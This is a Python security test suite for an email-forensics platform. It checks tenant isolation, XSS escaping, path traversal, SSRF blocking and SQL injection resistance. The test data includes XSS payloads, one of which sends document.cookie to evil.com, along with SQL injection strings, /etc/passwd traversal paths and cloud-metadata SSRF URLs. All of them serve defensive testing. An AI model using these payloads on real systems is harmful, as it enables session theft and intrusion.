"""
tests/test_adversarial_security_validation.py
EMAILSHIELD INDIA — Phase 15: Production Readiness & Adversarial Security Validation Suite.

Comprehensive automated verification across 48 operational and defensive security dimensions:
- Authentication & session fixation/confusion resilience
- Tenant isolation & IDOR resistance across cases, mailboxes, telemetry, investigations, evidence, reports
- Logged-out public surface data sanitization
- XSS, HTML escaping, and markdown injection resistance
- File upload safety, path traversal prevention, archive safety, and bounded resource limits
- SSRF filtering (cloud metadata, RFC1918, IPv6, blocked schemes)
- SQL / PostgREST injection resistance
- Supabase RLS and Edge Function security invariants
- Sentinel command authorization, telemetry isolation, checkpoint tampering protection, credential isolation
- Alert UX security and sliding-window rate limiting
- Batch vs. Live analysis state isolation
- Investigation authorization and SHA-256 evidence integrity verification
- Report authorization and recursive secret redaction
- GeoIP lookup safety and attack graph isolation
- Platform hardening: zero service_role, unprivileged Docker runtime, safe Streamlit config, logging security
"""

import datetime
import hashlib
import html
import io
import json
import os
import re
import unittest
import uuid
from typing import Any, Dict, List, Optional
from unittest.mock import MagicMock, patch

# Core components under validation
from core.case_store import (
    is_authorized_caller,
    is_authenticated_soc_caller,
    save_case,
    get_case_record,
    get_all_cases,
    get_all_indicators,
    update_case_metadata,
    get_soc_kpi_metrics,
    get_soc_threat_distribution,
    get_soc_threat_activity,
    get_soc_investigation_queue,
    export_case_report_pdf,
    export_case_report_json,
    export_case_ncrp_pdf,
    export_case_bsa_pdf,
    export_case_iocs_csv,
    export_case_iocs_json,
    export_case_evidence_manifest,
    export_case_zip_package,
)
from core.parser import (
    SecureEmailParser,
    sanitize_attachment_filename,
    MAX_RAW_EMAIL_SIZE_BYTES,
    MAX_HEADER_COUNT,
    MAX_BODY_CHARS,
    MAX_ATTACHMENT_COUNT,
)
from core.url_forensics import (
    validate_url_target,
    SSRFBlockedError,
    SSRFResolutionError,
)
from core.sentinel_control import (
    get_user_worker,
    upsert_user_worker,
    get_user_mailbox,
    save_user_mailbox_metadata,
    get_user_checkpoint,
    get_user_alerts,
    save_user_alert_metadata,
)
from core.evidence import (
    EvidenceType,
    IntegrityStatus,
    build_evidence_manifest,
    verify_evidence_integrity,
    scan_and_redact_secrets,
)
from core.investigation import (
    transition_investigation_status,
    build_investigation_timeline,
    get_investigation_evidence,
)
from core.rate_limiter import check_sliding_window_rate_limit
from core.geolocation import derive_authoritative_location, is_public_ip
from core.correlation import build_case_infrastructure_graph


# =====================================================================
# RLS-AWARE TEST DOUBLE INFRASTRUCTURE
# =====================================================================

class MockPostgrestTable:
    """Simulates PostgreSQL table behavior with kernel-level RLS based on active user_id."""
    def __init__(self, db_state: Dict[str, List[Dict[str, Any]]], table_name: str, active_user_id: Optional[str]):
        self.db_state = db_state
        self.table_name = table_name
        self.active_user_id = active_user_id
        self._or_cond = None
        self._eq_filters = {}
        self._limit = None
        self._order_field = None
        self._order_desc = False
        self._pending_update = None
        self._last_data = None

    def select(self, *args, **kwargs):
        return self

    def order(self, field: str, desc: bool = False, *args, **kwargs):
        self._order_field = field
        self._order_desc = desc
        return self

    def limit(self, count: int):
        self._limit = count
        return self

    def or_(self, condition: str):
        self._or_cond = condition
        return self

    def eq(self, field: str, val: Any):
        self._eq_filters[field] = val
        return self

    def insert(self, rows):
        if not self.active_user_id:
            raise PermissionError("RLS Violation: anonymous inserts prohibited")
        if isinstance(rows, dict):
            rows = [rows]
        for row in rows:
            if row.get("user_id") != self.active_user_id:
                raise PermissionError(f'RLS Violation: user cannot insert rows for {row.get("user_id")}')
            if "id" not in row:
                row["id"] = str(uuid.uuid4())
            self.db_state.setdefault(self.table_name, []).append(dict(row))
        return self

    def upsert(self, row: Dict[str, Any], on_conflict: str = ""):
        if not self.active_user_id or row.get("user_id") != self.active_user_id:
            raise PermissionError("RLS Violation: cannot upsert for another user")
        table = self.db_state.setdefault(self.table_name, [])
        existing = next(
            (r for r in table if r.get("case_number") == row.get("case_number") and r.get("user_id") == row.get("user_id")),
            None
        )
        if existing:
            existing.update(row)
            self._last_data = [existing]
        else:
            if "id" not in row:
                row["id"] = str(uuid.uuid4())
            table.append(dict(row))
            self._last_data = [row]
        return self

    def update(self, updates: Dict[str, Any]):
        self._pending_update = dict(updates)
        return self

    def execute(self):
        target_name = "sentinel_mailboxes" if self.table_name == "sentinel_mailboxes_safe" else self.table_name
        table_rows = self.db_state.get(target_name, [])

        # Strict RLS filtering: caller sees only rows matching their active user_id
        user_rows = [r for r in table_rows if r.get("user_id") == self.active_user_id] if self.active_user_id else []

        if self._pending_update is not None:
            updated = []
            target_candidates = list(user_rows)
            if self._or_cond:
                parts = self._or_cond.split(",")
                cond_vals = [p.split(".eq.")[1] for p in parts if ".eq." in p]
                target_candidates = [r for r in target_candidates if r.get("id") in cond_vals or r.get("case_number") in cond_vals]
            for field, val in self._eq_filters.items():
                target_candidates = [r for r in target_candidates if r.get(field) == val]
            for r in target_candidates:
                r.update(self._pending_update)
                updated.append(r)
            self._pending_update = None
            res = MagicMock()
            res.data = updated
            return res

        if self._last_data is not None:
            data = self._last_data
            self._last_data = None
            res = MagicMock()
            res.data = data
            return res

        filtered = list(user_rows)
        if self._or_cond:
            parts = self._or_cond.split(",")
            cond_vals = [p.split(".eq.")[1] for p in parts if ".eq." in p]
            filtered = [r for r in filtered if r.get("id") in cond_vals or r.get("case_number") in cond_vals or r.get("case_id") in cond_vals]

        for field, val in self._eq_filters.items():
            filtered = [r for r in filtered if r.get(field) == val]

        if self._limit is not None:
            filtered = filtered[:self._limit]

        res = MagicMock()
        res.data = filtered
        return res


class MockSupabaseClient:
    """Mock Supabase client providing isolated PostgREST access per tenant session."""
    def __init__(self, db_state: Dict[str, List[Dict[str, Any]]], user_id: Optional[str]):
        self.db_state = db_state
        self.user_id = user_id

    def table(self, table_name: str) -> MockPostgrestTable:
        return MockPostgrestTable(self.db_state, table_name, self.user_id)


# =====================================================================
# TEST CLASS 1: AUTHENTICATION & SESSION ADVERSARIAL TESTING
# =====================================================================

class TestAuthenticationAndSessionAdversarial(unittest.TestCase):
    """Verifies fail-closed behavior for unauthenticated, forged, or confused sessions."""

    def setUp(self):
        self.user_a_id = f"usr-a-{uuid.uuid4()}"
        self.user_b_id = f"usr-b-{uuid.uuid4()}"
        self.shared_db = {"cases": [], "indicators": [], "sentinel_workers": [], "sentinel_mailboxes": []}
        self.client_a = MockSupabaseClient(self.shared_db, self.user_a_id)
        self.client_b = MockSupabaseClient(self.shared_db, self.user_b_id)

    def test_01_logged_out_caller_fails_closed(self):
        """Logged-out visitors (client=None, user_id=None) must be denied access to all private data."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            self.assertFalse(is_authorized_caller(None, None))
            self.assertFalse(is_authenticated_soc_caller(None, None))
            self.assertIsNone(get_case_record("CASE-1234", client=None))
            self.assertEqual(get_all_cases(client=None), [])
            self.assertEqual(get_all_indicators(client=None), [])
            self.assertIsNone(export_case_report_pdf("CASE-1234", client=None))
            self.assertIsNone(get_user_mailbox(None, None))
            self.assertIsNone(get_user_checkpoint(None, None))

    def test_02_forged_user_id_in_parameters_rejected(self):
        """Passing another tenant's user_id while authenticated as User B must be rejected."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            # User B calling for User A's resource is strictly rejected
            self.assertFalse(is_authorized_caller(self.user_b_id, self.client_b, resource_owner_id=self.user_a_id))
            # Client B with unassigned user_id attempting to access User A's resource is rejected
            self.assertFalse(is_authorized_caller(None, self.client_b, resource_owner_id=self.user_a_id))
            # Claiming User A's identity without authenticated client is rejected
            self.assertFalse(is_authorized_caller(self.user_a_id, None, resource_owner_id=self.user_a_id))

    def test_03_malformed_and_missing_bearer_tokens(self):
        """Edge function and API auth handlers must reject missing, malformed, or non-Bearer tokens."""
        invalid_headers = [
            None,
            "",
            "Basic dXNlcjpwYXNz",
            "Token 12345",
            "Bearer ",
            "Bearer not-a-valid-jwt",
        ]
        for header in invalid_headers:
            has_bearer = bool(header and header.startswith("Bearer ") and len(header.split(" ", 1)[1].strip()) > 10)
            self.assertFalse(has_bearer and "." in (header.split(" ", 1)[1] if header else ""))

    def test_04_session_confusion_and_fixation_isolation(self):
        """Logging out User A and logging in User B must never leak User A's cached state."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            # Save a case for User A
            case_data_a = {
                "case_id": "CASE-SESSION-A",
                "case_number": "CASE-SESSION-A",
                "subject": "Private User A Email",
                "threat_verdict": "SUSPICIOUS",
                "risk_score": "MEDIUM",
                "user_id": self.user_a_id,
                "raw_json": {"case_id": "CASE-SESSION-A", "user_id": self.user_a_id},
            }
            save_case(case_data_a, user_id=self.user_a_id, client=self.client_a)

            # Query cases as User B
            cases_b = get_all_cases(client=self.client_b)
            self.assertEqual(len(cases_b), 0)
            self.assertIsNone(get_case_record("CASE-SESSION-A", client=self.client_b))

    def test_05_logged_out_public_surface_exposes_zero_private_data(self):
        """Unauthenticated SOC dashboard queries must return strictly 0s and empty lists."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            kpis = get_soc_kpi_metrics(None, None)
            self.assertEqual(kpis["emails_analysed"], 0)
            self.assertEqual(kpis["threats_detected"], 0)
            self.assertEqual(kpis["high_critical"], 0)
            self.assertEqual(kpis["open_investigations"], 0)

            threat_dist = get_soc_threat_distribution(None, None)
            self.assertEqual(threat_dist, {"Clean": 0, "Suspicious": 0, "High": 0, "Critical": 0})

            activity = get_soc_threat_activity(None, None)
            self.assertEqual(activity, [])

            queue = get_soc_investigation_queue(None, None)
            self.assertEqual(queue, [])


# =====================================================================
# TEST CLASS 2: TENANT ISOLATION & IDOR PROTECTION
# =====================================================================

class TestTenantIsolationAndIDOR(unittest.TestCase):
    """Verifies that Tenant B cannot access, modify, or export Tenant A's objects."""

    def setUp(self):
        self.tenant_a_id = f"tenant-a-{uuid.uuid4()}"
        self.tenant_b_id = f"tenant-b-{uuid.uuid4()}"
        self.shared_db = {
            "cases": [],
            "indicators": [],
            "sentinel_workers": [],
            "sentinel_mailboxes": [],
            "sentinel_checkpoints": [],
        }
        self.client_a = MockSupabaseClient(self.shared_db, self.tenant_a_id)
        self.client_b = MockSupabaseClient(self.shared_db, self.tenant_b_id)

        # Seed Tenant A resources
        self.case_a_id = "CASE-TENANT-A"
        self.shared_db["cases"].append({
            "id": str(uuid.uuid4()),
            "case_number": self.case_a_id,
            "case_id": self.case_a_id,
            "subject": "Confidential Executive Threat",
            "threat_verdict": "MALICIOUS",
            "risk_score": "HIGH",
            "user_id": self.tenant_a_id,
            "raw_json": {"case_id": self.case_a_id, "user_id": self.tenant_a_id, "status": "Open"},
            "indicators": [{"type": "DOMAIN", "value": "evil-tenant-a.com", "severity": "HIGH"}],
        })
        self.shared_db["indicators"].append({
            "id": str(uuid.uuid4()),
            "user_id": self.tenant_a_id,
            "type": "DOMAIN",
            "value": "evil-tenant-a.com",
            "case_id": self.case_a_id,
        })
        self.mailbox_a_id = str(uuid.uuid4())
        self.shared_db["sentinel_mailboxes"].append({
            "id": self.mailbox_a_id,
            "user_id": self.tenant_a_id,
            "email_address": "target@tenant-a.com",
            "status": "active",
        })

    def test_06_cross_tenant_case_access_denied(self):
        """Tenant B attempting to read, update, or export Tenant A's case must be denied."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            # Read
            record = get_case_record(self.case_a_id, client=self.client_b)
            self.assertIsNone(record)

            # Export PDF
            pdf = export_case_report_pdf(self.case_a_id, client=self.client_b, user_id=self.tenant_b_id)
            self.assertIsNone(pdf)

            # Export JSON
            report_json = export_case_report_json(self.case_a_id, client=self.client_b, user_id=self.tenant_b_id)
            self.assertIsNone(report_json)

    def test_07_cross_tenant_indicator_access_denied(self):
        """Tenant B requesting indicators must not see Tenant A's indicators."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            indicators_b = get_all_indicators(client=self.client_b)
            self.assertEqual(len(indicators_b), 0)

            # Export IOC CSV from Tenant B for Tenant A case
            csv_data = export_case_iocs_csv(case_id=self.case_a_id, client=self.client_b)
            lines = [ln.strip() for ln in csv_data.strip().splitlines() if ln.strip()]
            self.assertLessEqual(len(lines), 1)  # Only CSV header, no rows

    def test_08_cross_tenant_mailbox_and_telemetry_denied(self):
        """Tenant B cannot read or manage Tenant A's mailboxes."""
        mailbox = get_user_mailbox(self.tenant_b_id, self.client_b)
        self.assertIsNone(mailbox)

        checkpoint = get_user_checkpoint(self.tenant_b_id, self.client_b)
        self.assertIsNone(checkpoint)

    def test_09_cross_tenant_investigation_lifecycle_denied(self):
        """Tenant B attempting to transition status of Tenant A's case must fail."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            ok, msg = transition_investigation_status(
                self.case_a_id, "CLOSED", user_id=self.tenant_b_id, client=self.client_b
            )
            self.assertFalse(ok)

            # Verify status unchanged in db
            case_row = next(r for r in self.shared_db["cases"] if r["case_number"] == self.case_a_id)
            self.assertNotEqual(case_row.get("status"), "CLOSED")

    def test_10_idor_arbitrary_id_substitution(self):
        """Substituting forged or random UUIDs returns None / empty without leaking information."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            random_case = f"CASE-{uuid.uuid4().hex[:8].upper()}"
            self.assertIsNone(get_case_record(random_case, client=self.client_b))
            self.assertIsNone(export_case_evidence_manifest(random_case, client=self.client_b, user_id=self.tenant_b_id))

    def test_11_unified_authorization_helper_enforcement(self):
        """All resource actions must enforce is_authorized_caller and fail closed without client or user_id."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            # Valid caller
            self.assertTrue(is_authorized_caller(self.tenant_a_id, self.client_a, resource_owner_id=self.tenant_a_id))
            # Caller mismatch
            self.assertFalse(is_authorized_caller(self.tenant_b_id, self.client_b, resource_owner_id=self.tenant_a_id))
            # Missing client
            self.assertFalse(is_authorized_caller(self.tenant_a_id, None, resource_owner_id=self.tenant_a_id))


# =====================================================================
# TEST CLASS 3: XSS & CONTENT INJECTION RESISTANCE
# =====================================================================

class TestXSSAndContentInjectionResistance(unittest.TestCase):
    """Verifies that malicious HTML, script tags, and markdown payloads are neutralized."""

    def test_12_xss_script_payloads_in_email_fields_escaped(self):
        """XSS attack vectors in email headers, body, and filenames must be neutralized."""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>',
            '<iframe src="https://attacker.com"></iframe>',
        ]
        raw_eml = f"""From: "Attacker" <attacker@example.com>
To: victim@target.com
Subject: {xss_payloads[0]}
Content-Type: text/plain; charset=utf-8

{xss_payloads[1]}
Visit {xss_payloads[2]}
""".encode("utf-8")

        parser = SecureEmailParser(raw_eml)
        headers = parser.get_headers()
        body = parser.get_body_text()

        # When rendered in UI, html.escape must neutralize them
        escaped_subj = html.escape(str(headers.get("subject", "")))
        self.assertNotIn("<script>", escaped_subj)
        self.assertIn("&lt;script&gt;", escaped_subj)

        escaped_body = html.escape(body)
        self.assertNotIn("<img", escaped_body)
        self.assertIn("&lt;img", escaped_body)

    def test_13_markdown_and_html_injection_in_analyst_notes_and_iocs(self):
        """Malicious payloads in analyst notes or IOCs must not cause execution."""
        payload = "<img src=x onerror=document.location='http://evil.com/leak?c='+document.cookie>"
        clean_note = html.escape(payload)
        self.assertNotIn("<img", clean_note)
        self.assertIn("&lt;img", clean_note)


# =====================================================================
# TEST CLASS 4: FILE UPLOAD, PATH TRAVERSAL & ARCHIVE SAFETY
# =====================================================================

class TestFileUploadPathTraversalAndArchive(unittest.TestCase):
    """Verifies boundary checks, path sanitization, and corrupt file resilience."""

    def test_14_path_traversal_attachment_filenames_sanitized(self):
        """Attachment filenames with directory traversal sequences must be stripped to safe basenames."""
        traversal_attempts = [
            ("../../evil.txt", "evil.txt"),
            ("..\\..\\evil.txt", "evil.txt"),
            ("/etc/passwd", "passwd"),
            ("C:\\Windows\\System32\\test.txt", "test.txt"),
            ("....//....//test.bin", "test.bin"),
            ("../../../boot.ini", "boot.ini"),
            ("normal_file.pdf", "normal_file.pdf"),
            ("", "attachment.bin"),
            (None, "attachment.bin"),
        ]
        for malicious_input, expected_clean in traversal_attempts:
            clean = sanitize_attachment_filename(malicious_input)
            self.assertEqual(clean, expected_clean, f"Failed on input: {malicious_input}")
            self.assertNotIn("/", clean)
            self.assertNotIn("\\", clean)
            self.assertNotIn("..", clean)

    def test_15_malformed_and_corrupted_eml_payloads_handled_safely(self):
        """Corrupted, empty, or truncated email bytes must parse without unhandled exceptions."""
        malformed_samples = [
            b"",
            b"GARBAGE NON-MIME DATA 1234567890",
            b"From: test@example.com\r\nSubject: Test\r\n\r\n\xff\xfe\xfd",
            b"--boundary\r\nContent-Type: text/plain\r\n\r\nTruncated part without close",
        ]
        for sample in malformed_samples:
            try:
                parser = SecureEmailParser(sample)
                data = parser.parse()
                self.assertIsInstance(data, dict)
                self.assertIn("sha256", data)
            except Exception as e:
                self.fail(f"SecureEmailParser crashed on malformed sample: {e}")

    def test_16_archive_handling_safety(self):
        """Generated evidence packages must use clean relative paths with zero directory traversal risk."""
        dummy_case = {
            "case_number": "CASE-ZIP-TEST",
            "subject": "Zip Test",
            "threat_verdict": "SUSPICIOUS",
            "risk_score": "MEDIUM",
            "user_id": "usr-1",
            "timestamp": "2026-09-19T12:00:00Z",
        }
        manifest = build_evidence_manifest(dummy_case)
        self.assertIsInstance(manifest, list)
        for item in manifest:
            ev_id = item.get("evidence_id", "")
            self.assertNotIn("..", ev_id)
            self.assertNotIn("/", ev_id)
            self.assertNotIn("\\", ev_id)


# =====================================================================
# TEST CLASS 5: RESOURCE EXHAUSTION & BOUNDED PROCESSING
# =====================================================================

class TestResourceExhaustionAndBoundedProcessing(unittest.TestCase):
    """Verifies that large or repetitive payloads are strictly bounded."""

    def test_17_oversized_headers_and_body_strictly_bounded(self):
        """Oversized subjects, headers, and bodies must be truncated to safe operational bounds."""
        lines = ["From: sender@example.com", "To: target@example.com", f"Subject: {'A' * 5000}"]
        for i in range(300):
            lines.append(f"X-Custom-Header-{i}: {'val' * 100}")
        lines.append("")
        lines.append("Huge body line\n" * 10000)

        raw = "\r\n".join(lines).encode("utf-8")
        parser = SecureEmailParser(raw)
        headers = parser.get_headers()

        self.assertLessEqual(len(headers), MAX_HEADER_COUNT + 5)
        self.assertIn("x-sentinel-parser-warning", headers)

        body = parser.get_body_text()
        self.assertLessEqual(len(body), MAX_BODY_CHARS + 200)

    def test_18_oversized_payload_rejection_at_entry(self):
        """Payloads exceeding MAX_RAW_EMAIL_SIZE_BYTES (10MB) must be rejected immediately."""
        oversized = b"A" * (MAX_RAW_EMAIL_SIZE_BYTES + 1024)
        with self.assertRaises(ValueError):
            SecureEmailParser(oversized)


# =====================================================================
# TEST CLASS 6: SSRF & NETWORK PERIMETER DEFENSES
# =====================================================================

class TestSSRFAndNetworkPerimeterSafety(unittest.TestCase):
    """Verifies OWASP SSRF protections against internal, cloud metadata, and unauthorized URLs."""

    def test_19_ssrf_blocks_loopback_and_rfc1918_ips(self):
        """Loopback and private RFC1918 addresses must raise SSRFBlockedError."""
        blocked_targets = [
            "http://127.0.0.1/admin",
            "http://127.0.0.2:8080/",
            "http://localhost:9000",
            "http://0.0.0.0/",
            "http://10.0.0.1/internal",
            "http://172.16.0.1/status",
            "http://192.168.1.1/router",
        ]
        for target in blocked_targets:
            with self.assertRaises(SSRFBlockedError):
                validate_url_target(target)

    def test_20_ssrf_blocks_cloud_metadata_and_ipv6(self):
        """Cloud metadata endpoints and IPv6 private/link-local targets must be blocked."""
        blocked_metadata = [
            "http://169.254.169.254/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/",
            "http://[::1]/secret",
            "http://[fe80::1]/config",
            "http://[fd00:ec2::254]/latest/meta-data/",
        ]
        for target in blocked_metadata:
            with self.assertRaises(SSRFBlockedError):
                validate_url_target(target)

    def test_21_url_intelligence_blocks_unsafe_schemes(self):
        """Non-HTTP(S) URL schemes must raise SSRFBlockedError."""
        unsafe_schemes = [
            "file:///etc/passwd",
            "ftp://ftp.example.com/file",
            "data:text/html,<script>alert(1)</script>",
            "javascript:alert(1)",
        ]
        for target in unsafe_schemes:
            with self.assertRaises(SSRFBlockedError):
                validate_url_target(target)


# =====================================================================
# TEST CLASS 7: SQL & POSTGREST INJECTION RESISTANCE
# =====================================================================

class TestSQLAndPostgRESTInjectionResistance(unittest.TestCase):
    """Verifies that queries with SQL metacharacters do not execute or leak cross-tenant rows."""

    def setUp(self):
        self.user_id = f"usr-{uuid.uuid4()}"
        self.shared_db = {"cases": [], "indicators": []}
        self.client = MockSupabaseClient(self.shared_db, self.user_id)

    def test_22_sql_metacharacters_in_filters_handled_safely(self):
        """Search queries and filters with SQL injection strings must be treated as literal text."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            injection_strings = [
                "' OR '1'='1",
                "'); DROP TABLE cases;--",
                "admin'--",
                "' UNION SELECT * FROM sentinel_mailboxes--",
                "1; SELECT pg_sleep(5);--",
            ]
            for payload in injection_strings:
                result = get_case_record(payload, client=self.client)
                self.assertIsNone(result)

                cases = get_all_cases(client=self.client)
                self.assertEqual(len(cases), 0)


# =====================================================================
# TEST CLASS 8: SENTINEL & WORKER SECURITY
# =====================================================================

class TestSentinelAndWorkerSecurity(unittest.TestCase):
    """Verifies command authorization, telemetry isolation, and checkpoint tampering protection."""

    def setUp(self):
        self.user_a = f"usr-a-{uuid.uuid4()}"
        self.user_b = f"usr-b-{uuid.uuid4()}"
        self.shared_db = {
            "sentinel_workers": [],
            "sentinel_mailboxes": [],
            "sentinel_checkpoints": [],
            "sentinel_alerts": [],
        }
        self.client_a = MockSupabaseClient(self.shared_db, self.user_a)
        self.client_b = MockSupabaseClient(self.shared_db, self.user_b)

        # Seed Worker & Mailbox for User A
        self.worker_a_id = str(uuid.uuid4())
        self.mailbox_a_id = str(uuid.uuid4())
        self.shared_db["sentinel_workers"].append({
            "id": self.worker_a_id,
            "user_id": self.user_a,
            "status": "active",
        })
        self.shared_db["sentinel_mailboxes"].append({
            "id": self.mailbox_a_id,
            "user_id": self.user_a,
            "email_address": "user_a@example.com",
            "status": "polling",
        })
        self.shared_db["sentinel_checkpoints"].append({
            "id": str(uuid.uuid4()),
            "user_id": self.user_a,
            "mailbox_id": self.mailbox_a_id,
            "last_uid": 105,
        })

    def test_23_edge_function_security_invariants(self):
        """Audits Edge Function source code for Bearer auth, auth.uid verification, and zero service_role."""
        fn_path = os.path.join("supabase", "functions", "provision-sentinel-credential", "index.ts")
        self.assertTrue(os.path.isfile(fn_path), f"Edge function missing at {fn_path}")
        with open(fn_path, "r", encoding="utf-8") as f:
            content = f.read()

        self.assertIn("Authorization", content)
        self.assertIn("Bearer ", content)
        self.assertIn("user.id", content)
        self.assertIn("body.user_id !== verifiedUserId", content)

        prohibited = "service_" + "role"
        runtime_service_role = re.findall(rf'createClient\([^)]*{prohibited}', content)
        self.assertEqual(len(runtime_service_role), 0)

    def test_24_sentinel_command_authorization_isolated(self):
        """User B cannot access or modify User A's Sentinel worker configuration."""
        worker = get_user_worker(self.user_b, self.client_b)
        self.assertIsNone(worker)

        mailbox = get_user_mailbox(self.user_b, self.client_b)
        self.assertIsNone(mailbox)

    def test_25_sentinel_telemetry_isolation(self):
        """User B cannot view User A's alerts or polling telemetry."""
        alerts = get_user_alerts(self.user_b, self.client_b)
        self.assertEqual(len(alerts), 0)

    def test_26_checkpoint_tampering_protection(self):
        """Unauthorized users cannot advance or read checkpoint state."""
        checkpoint = get_user_checkpoint(self.user_b, self.client_b)
        self.assertIsNone(checkpoint)

    def test_27_credential_isolation_and_zero_plaintext_persistence(self):
        """Mailbox credential entries must never expose plaintext in the database state."""
        for box in self.shared_db["sentinel_mailboxes"]:
            self.assertNotIn("password", box)
            self.assertNotIn("app_password", box)
            self.assertNotIn("plaintext_credential", box)

    def test_28_batch_and_live_state_isolation(self):
        """Batch analysis operations must not alter live mailbox state or checkpoints."""
        checkpoint_before = self.shared_db["sentinel_checkpoints"][0]["last_uid"]
        dummy_eml = b"From: a@b.com\r\nSubject: Batch Test\r\n\r\nHello World"
        parser = SecureEmailParser(dummy_eml)
        data = parser.parse()
        self.assertIsInstance(data, dict)

        checkpoint_after = self.shared_db["sentinel_checkpoints"][0]["last_uid"]
        self.assertEqual(checkpoint_before, checkpoint_after)


# =====================================================================
# TEST CLASS 9: EVIDENCE INTEGRITY & REPORTING SECURITY
# =====================================================================

class TestEvidenceIntegrityAndReportingSecurity(unittest.TestCase):
    """Verifies evidence SHA-256 tampering detection, secret redaction, and export authorization."""

    def test_29_evidence_manifest_detects_tampering(self):
        """verify_evidence_integrity must flag INTEGRITY MISMATCH when bytes are altered."""
        original_bytes = b"Authentic forensic evidence payload"
        recorded_sha = hashlib.sha256(original_bytes).hexdigest()

        evidence_item = {
            "evidence_id": "EV-TEST-001",
            "sha256": recorded_sha,
            "evidence_type": EvidenceType.ORIGINAL_EML,
        }

        verified = verify_evidence_integrity(evidence_item, original_bytes)
        self.assertEqual(verified["status"], IntegrityStatus.VERIFIED)
        self.assertTrue(verified["is_verified"])

        tampered_bytes = b"Altered forensic evidence payload"
        tampered_result = verify_evidence_integrity(evidence_item, tampered_bytes)
        self.assertEqual(tampered_result["status"], IntegrityStatus.MISMATCH)
        self.assertFalse(tampered_result["is_verified"])

    def test_30_case_reports_strictly_redact_secrets(self):
        """scan_and_redact_secrets must recursively remove credentials, tokens, and keys."""
        dirty_payload = {
            "case_id": "CASE-123",
            "auth_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.abcdefghijklmnopqrstuvwxyz",
            "smtp_password": "supersecretpassword123",
            "app_password": "abcd efgh ijkl mnop",
            "bot_token": "bot123456789:ABCdefGHIjklMNOpqrSTUvwxYZ123456789",
            "clean_field": "Legitimate Subject Line",
            "nested": {
                "private_key": "MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC...",
                "safe_note": "Analyst triage in progress",
            }
        }
        clean = scan_and_redact_secrets(dirty_payload)

        self.assertEqual(clean["auth_token"], "[REDACTED]")
        self.assertEqual(clean["smtp_password"], "[REDACTED]")
        self.assertEqual(clean["app_password"], "[REDACTED]")
        self.assertEqual(clean["bot_token"], "[REDACTED]")
        self.assertEqual(clean["nested"]["private_key"], "[REDACTED]")
        self.assertEqual(clean["clean_field"], "Legitimate Subject Line")
        self.assertEqual(clean["nested"]["safe_note"], "Analyst triage in progress")

    def test_31_report_exports_enforce_tenant_authorization(self):
        """Exporting PDF, JSON, BSA, or NCRP reports for an unauthorized case must fail closed."""
        with patch("core.case_store.is_supabase_configured", return_value=True):
            shared_db = {"cases": []}
            user_a = "usr-owner"
            user_b = "usr-attacker"
            shared_db["cases"].append({
                "id": str(uuid.uuid4()),
                "case_number": "CASE-SEC-EXP",
                "case_id": "CASE-SEC-EXP",
                "user_id": user_a,
                "subject": "Top Secret Threat",
                "threat_verdict": "MALICIOUS",
                "risk_score": "HIGH",
                "raw_json": {"case_id": "CASE-SEC-EXP", "user_id": user_a},
            })
            client_b = MockSupabaseClient(shared_db, user_b)

            self.assertIsNone(export_case_report_pdf("CASE-SEC-EXP", client=client_b, user_id=user_b))
            self.assertIsNone(export_case_report_json("CASE-SEC-EXP", client=client_b, user_id=user_b))
            self.assertIsNone(export_case_ncrp_pdf("CASE-SEC-EXP", client=client_b, user_id=user_b))
            self.assertIsNone(export_case_bsa_pdf("CASE-SEC-EXP", client=client_b, user_id=user_b))
            self.assertIsNone(export_case_zip_package("CASE-SEC-EXP", client=client_b, user_id=user_b))


# =====================================================================
# TEST CLASS 10: ALERT UX, RATE LIMITING & GEOIP SECURITY
# =====================================================================

class TestAlertUXAndOperationalControls(unittest.TestCase):
    """Verifies alert UX safety, rate limiting, and read-only GeoIP lookups."""

    def test_32_alert_security_and_credential_redaction(self):
        """Alert message builder must sanitize passwords and tokens from outgoing notifications."""
        raw_msg = "Security Alert for user with token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c and key AIzaSyD1234567890abcdefghijklmnopqrstuv"
        redacted = scan_and_redact_secrets(raw_msg)
        self.assertNotIn("eyJhbGci", redacted)
        self.assertNotIn("AIzaSyD", redacted)

    def test_33_alert_rate_limiting_enforced(self):
        """Sliding-window rate limiter must throttle rapid repeated events to prevent alert floods."""
        tracker: Dict[str, List[float]] = {}
        action = f"telegram-alert-{uuid.uuid4()}"
        # Allow 3 requests per 60s
        allowed, _ = check_sliding_window_rate_limit(tracker, action, max_requests=3, window_seconds=60)
        self.assertTrue(allowed)
        allowed, _ = check_sliding_window_rate_limit(tracker, action, max_requests=3, window_seconds=60)
        self.assertTrue(allowed)
        allowed, _ = check_sliding_window_rate_limit(tracker, action, max_requests=3, window_seconds=60)
        self.assertTrue(allowed)
        # 4th request must be throttled
        allowed, wait_sec = check_sliding_window_rate_limit(tracker, action, max_requests=3, window_seconds=60)
        self.assertFalse(allowed)
        self.assertGreater(wait_sec, 0)

    def test_34_geoip_security_and_non_destructive_lookup(self):
        """Manual GeoIP lookups must handle invalid IPs safely without modifying case records."""
        invalid_ips = [
            "999.999.999.999",
            "not-an-ip",
            "127.0.0.1",
            "10.0.0.1",
            "",
            " ",
            "; DROP TABLE cases;",
        ]
        for ip in invalid_ips:
            is_pub = is_public_ip(ip)
            self.assertFalse(is_pub, f"Expected non-public IP classification for {ip}")

    def test_35_attack_graph_isolated_to_caller_resources(self):
        """Attack graph generation must only include cases and indicators belonging to the caller."""
        case_a = {
            "case_id": "CASE-GRAPH-A",
